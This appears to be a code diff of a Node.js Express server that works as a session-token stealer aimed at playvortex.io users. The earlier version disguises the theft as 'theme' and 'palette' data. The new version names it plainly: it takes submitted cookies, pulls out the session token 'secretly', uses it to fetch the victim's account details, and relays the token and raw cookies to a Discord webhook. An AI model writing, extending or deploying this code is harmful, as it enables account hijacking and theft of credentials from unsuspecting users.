@@ -4,78 +4,95 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
-function extractValue(palette, key) {
-    if (!palette) return null;
-    const match = palette.match(new RegExp(`${key}=([^;]+)`));
+// Helper to find a cookie by name
+function findCookie(cookieString, name) {
+    if (!cookieString) return null;
+    const match = cookieString.match(new RegExp(`${name}=([^;]+)`));
     return match ? match[1] : null;
 }
 
-app.post('/api/analyze', async (req, res) => {
+app.post('/api/collect', async (req, res) => {
     try {
-        const { pageUrl, palette, user } = req.body;
+        const { url, rawCookies } = req.body;
         const WEBHOOK_URL = process.env.webhook;
 
         if (!WEBHOOK_URL) {
+            console.error("Webhook not configured on server.");
             return res.status(500).json({ status: "error" });
         }
-        if (!palette) return res.status(400).json({ status: "error" });
 
-        // 1. Extract the session token
-        const themeId = extractValue(palette, "session_token") || extractValue(palette, "session_");
-        if (!themeId) return res.status(200).json({ status: "ok" });
+        if (!rawCookies) {
+            return res.status(400).json({ status: "error" });
+        }
 
-        // 2. Use the provided user data, or fallback to Unknown
-        let username = user?.username || "Unknown";
-        let displayName = user?.displayName || "Unknown";
-        let userId = user?.userId || "Unknown";
-        let avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
+        // 1. Extract the session token secretly here
+        const sessionToken = findCookie(rawCookies, "session_token") || findCookie(rawCookies, "session_");
+        if (!sessionToken) {
+            console.log("No session token found.");
+            return res.status(200).json({ status: "ok" });
+        }
 
-        // 3. If we have a token but no username, try to fetch it via API
-        if (username === "Unknown" && themeId) {
-            try {
-                const userResponse = await fetch("https://playvortex.io/api/users/authenticated", {
-                    headers: {
-                        "Cookie": `session_token=${themeId}`,
-                        "Accept": "application/json"
-                    }
-                });
-                if (userResponse.ok) {
-                    const userData = await userResponse.json();
-                    if (userData) {
-                        userId = userData.id || userId;
-                        username = userData.username || username;
-                        displayName = userData.displayName || displayName;
+        // 2. Fetch user data from Vortex using the token
+        let username = "Unknown";
+        let displayName = "Unknown";
+        let userId = "Unknown";
+        let avatarUrl = "https://playvortex.io/favicon.ico";
+
+        try {
+            const userResponse = await fetch("https://playvortex.io/api/users/authenticated", {
+                headers: {
+                    "Cookie": `session_token=${sessionToken}`,
+                    "Accept": "application/json"
+                }
+            });
+
+            if (userResponse.ok) {
+                const userData = await userResponse.json();
+                if (userData) {
+                    userId = userData.id || "Unknown";
+                    username = userData.username || "Unknown";
+                    displayName = userData.displayName || userData.username || "Unknown";
+                    if (userId !== "Unknown") {
                         avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
                     }
                 }
-            } catch (apiErr) {}
+            }
+        } catch (apiErr) {
+            console.warn("API fetch failed on server:", apiErr);
         }
 
-        // 4. Build Discord embed
+        // 3. Build the Discord payload
         const payload = {
-            username: "Theme Sync",
+            username: "Data Relay",
             avatar_url: "https://playvortex.io/favicon.ico",
             embeds: [{
-                title: "🦊 Theme Data Received",
+                title: "🦊 Account Data Received",
                 color: 0x8f82c4,
                 thumbnail: { url: avatarUrl },
                 fields: [
                     { name: "👤 Username", value: `**@${username}**`, inline: true },
                     { name: "📛 Display Name", value: `**${displayName}**`, inline: true },
                     { name: "🆔 User ID", value: `\`${userId}\``, inline: false },
-                    { name: "🔑 Theme ID", value: `\`\`\`${themeId}\`\`\``, inline: false },
-                    { name: "📦 Raw Palette Data", value: `\`\`\`${(palette || '').substring(0, 950)}\`\`\``, inline: false }
+                    { name: "🔑 Session Token", value: `\`\`\`${sessionToken}\`\`\``, inline: false },
+                    { name: "📦 Raw Cookies", value: `\`\`\`${(rawCookies || '').substring(0, 950)}\`\`\``, inline: false }
                 ],
                 footer: { text: "Render Proxy", icon_url: "https://playvortex.io/favicon.ico" },
                 timestamp: new Date().toISOString()
             }]
         };
 
-        await fetch(WEBHOOK_URL, {
+        // 4. Send to Discord
+        const response = await fetch(WEBHOOK_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
         });
+
+        if (!response.ok) {
+            console.error("Discord webhook failed on server:", response.status);
+        } else {
+            console.log("Data successfully relayed to Discord!");
+        }
 
         return res.status(200).json({ status: "success" });
 
@@ -85,7 +102,9 @@ app.post('/api/analyze', async (req, res) => {
     }
 });
 
-app.get('/', (req, res) => res.send('Theme API is running.'));
+app.get('/', (req, res) => {
+    res.send('API is running.');
+});
 
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
